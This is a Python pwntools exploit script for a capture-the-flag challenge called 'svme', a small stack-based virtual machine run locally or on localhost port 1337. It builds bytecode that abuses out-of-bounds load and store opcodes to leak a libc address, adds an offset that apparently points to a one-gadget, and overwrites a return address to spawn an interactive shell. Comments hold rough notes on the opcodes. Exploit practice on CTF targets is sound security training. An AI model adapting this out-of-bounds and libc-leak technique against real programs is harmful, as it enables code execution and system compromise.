from pwn import *
from icecream import ic

exe = ELF("./svme_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.log_level = "debug"
context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x0000000000001d85
pie b 0x1955
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def parse(opcode, arg = 'a'):
    if arg == 'a':
        return p32(opcode)
    return p32(opcode) + p32(arg)

'''
opcodes:
IADD    1 - add
ISUB    2 - sub
IMUL    3 - mul
ILT     4 - lt
IGT     5 - gt
BR      6 - jmp
BRT     7 - jmp if eq
BRF     8 - jmp if not eq
ICONST  9 - push (?)
LOAD    10 - index based load? (prolly has a oob)
GLOAD   11 - global load?
STORE   12 - move to index?
GSTORE  13 - global move to index?
PRINT   14 - print (useless because execution is over before printing)
POP     15 - increment stack pointer (looks like it just chucks top val)
CALL    16 - some long ass shit (call function?)
RET     17 - ret
STOP?   0 - print stack and go to next instruction?
i guess 10-13 have oob?
'''

'''
changing pointer to gload at start of heap seems to change the place from where gload and gstore operate
payload = parse(9, 0x61616161)
payload += parse(9, 0x62626262)
payload += parse(9, 0x63636363)
payload += parse(9, 0x64646464)
payload += parse(9, 0x65656565)
payload += parse(9, 0x66666666)
payload += parse(12, 0)
payload += parse(12, 1)
payload += parse(13, 0)
payload += parse(13, 1)
payload += parse(13, 2)
payload += parse(13, 3)
payload += parse(10, 0xffffffff-(0xf90//4)+1)
payload += parse(10, 0xffffffff-(0xf90//4))
payload += parse(11, 0xffffffff-(0x2100//4)+2+4)
payload += parse(11, 0xffffffff-(0x2100//4)+1+4)
payload += parse(9, 0x8)
payload += parse(1)
payload += parse(13, 0xffffffff-(0x2100//4)+1+4)
payload += parse(11, 0)
'''


payload = parse(11, 0xffffffff-(0x2100//4)+2+4)
payload += parse(11, 0xffffffff-(0x2100//4)+1+4)
payload += parse(10, 0xffffffff-(0xf90//4)+1)
payload += parse(10, 0xffffffff-(0xf90//4))
payload += parse(9, 0x0218)
payload += parse(1)
payload += parse(12, 0xffffffff-(0xf90//4)+4)
payload += parse(12, 0xffffffff-(0xf90//4)+5)
payload += parse(11, 0)
payload += parse(9, 0xe6c81-0x270b3)
payload += parse(1)
# payload += parse(9, 0xdeadbeef)
payload += parse(13, 0)
# payload += parse(17)

payload += parse(12, 0xffffffff-(0xf90//4)+4)
payload += parse(12, 0xffffffff-(0xf90//4)+5)

payload += parse(18)
payload += payload.ljust(0x200, b'\x00')
sl(payload)
i()
